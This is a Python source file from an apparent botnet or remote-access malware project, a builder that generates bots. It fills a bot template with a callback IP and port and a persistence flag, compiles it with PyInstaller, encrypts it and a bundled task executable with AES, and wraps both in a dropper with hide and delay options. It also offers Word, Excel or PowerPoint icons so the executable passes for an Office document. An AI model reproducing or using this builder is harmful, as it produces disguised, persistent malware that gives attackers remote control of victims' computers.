# Date: 09/01/2018
# Author: Pure-L0G1C
# Description: Execute creator

import os
import sys
import zlib
import shlex
import shutil
import smtplib
import tempfile
from lib.file import File
from lib.args import Args
from lib.aes import CryptoAES

try:
    from PyInstaller import __main__ as pyi, is_win
except:
    print('Please install Pyinstaller: pip install pyinstaller')
    sys.exit(1)


class Executor(object):

    def __init__(self, ip, port, filename, delay, wait, exe, icon, hide, persist):
        self.ip = ip
        self.exe = exe
        self.port = port
        self.hide = hide
        self.wait = wait
        self.binary = b''
        self.delay = delay
        self.persist = persist
        self.filename = filename
        self.icon = shlex.quote(icon)
        self.key = CryptoAES.generate_key()

        # Tasks - Windows only
        self.cyclops = None

        self.output_dir = 'output'
        self.tmp_dir = tempfile.mkdtemp()
        self.dist_path = os.path.join(self.tmp_dir, 'application')

        self.output_dir = 'output'
        self.dist_path = os.path.join(self.tmp_dir, 'application')

        self.bot_template = 'bot' + os.path.sep + 'template_bot.py'
        self.bot_py_temp = 'bot' + os.path.sep + '{}.py'.format(filename)
        self.bot_compiled = self.dist_path + \
            os.path.sep + '{}.exe'.format(filename)

        self.cyclops_exe = os.path.join('bot', 'tasks', 'cyclops_windows.exe')

        self.dropper_template = 'lib' + os.path.sep + 'dropper.py'
        self.dropper_py_temp = '{}.py'.format(filename)

    def replace(self, data, _dict):
        for k in _dict:
            data = data.replace(k, _dict[k])
        return data

    def compile_file(self, path):
        path = os.path.abspath(path)

        build_path = os.path.join(self.tmp_dir, 'build')
        cmd = 'pyinstaller -y -F -w -i {} {}'.format(
            self.icon, shlex.quote(path))

        sys.argv = shlex.split(cmd) + ['--distpath', self.dist_path] + \
            ['--workpath', build_path] + ['--specpath', self.tmp_dir]

        pyi.run()

    def write_template(self, template, py_temp, _dict):
        data = ''
        for _data in File.read(template, False):
            data += _data

        File.write(py_temp, self.replace(data, _dict))

        if self.exe:
            self.compile_file(py_temp)

    def compile_bot(self):
        _dict = {
            'addr_ip': repr(self.ip),
            'addr_port': str(self.port),
            'wait_time': str(self.wait),
            'auto_persist': repr(self.persist)
        }

        self.write_template(self.bot_template, self.bot_py_temp, _dict)

        if self.exe:
            with open(self.bot_compiled, 'rb') as f:
                self.binary = CryptoAES.encrypt(
                    zlib.compress(f.read(), level=9),
                    self.key
                )

            ######## Tasks ########

            # Cyclops
            with open(self.cyclops_exe, 'rb') as f:
                self.cyclops = CryptoAES.encrypt(
                    zlib.compress(f.read(), level=9),
                    self.key
                )

    def compile_dropper(self):
        _dict = {
            'data_name': repr('_{}.exe'.format(self.filename)),
            'data_binary': repr(self.binary),
            'data_key': repr(self.key),
            'data_hide': str(self.hide),
            'data_delay': str(self.delay),
            'task_cyclops': repr(self.cyclops)
        }

        self.write_template(self.dropper_template, self.dropper_py_temp, _dict)

    def move_file(self, file):
        if not os.path.exists(self.output_dir):
            os.mkdir(self.output_dir)
        else:
            _path = os.path.join(self.output_dir, file)
            if os.path.exists(_path):
                os.remove(_path)

        path = os.path.join(self.dist_path, file)
        shutil.move(path, self.output_dir)

    def start(self):
        self.compile_bot()
        if self.exe:
            self.compile_dropper()
            file = os.listdir(self.dist_path)[0]
            self.move_file(file)
            self.clean_up()

    def clean_up(self):
        shutil.rmtree(self.tmp_dir)
        os.remove(self.bot_py_temp)
        os.remove(self.dropper_py_temp)


if __name__ == '__main__':
    args = Args()
    if args.set_args():
        if not args.icon and args.type:
            icons = {
                1: 'icons/wordicon.ico',
                2: 'icons/excelicon.ico',
                3: 'icons/ppticon.ico'
            }

            option = input(
                '\n\n1) MS Word\n2) MS Excel\n3) MS Powerpoint\n\nSelect an icon option: ')

            if not option.isdigit():
                args.icon = icons[1]
            elif int(option) > 3 or int(option) < 1:
                args.icon = icons[1]
            else:
                args.icon = icons[int(option)]

            args.icon = os.path.abspath(args.icon)

        executor = Executor(args.ip, args.port, args.name, args.delay,
                            args.wait, args.type, args.icon, args.hide, args.persist)

        executor.start()
        os.system('cls' if is_win else 'clear')
        print('\nFinished creating {}'.format(executor.filename +
                                              '.exe' if executor.exe else executor.bot_py_temp))
        print('Look in the directory named output for your exe file' if executor.exe else 'Look in the directory named bot for your Python file')
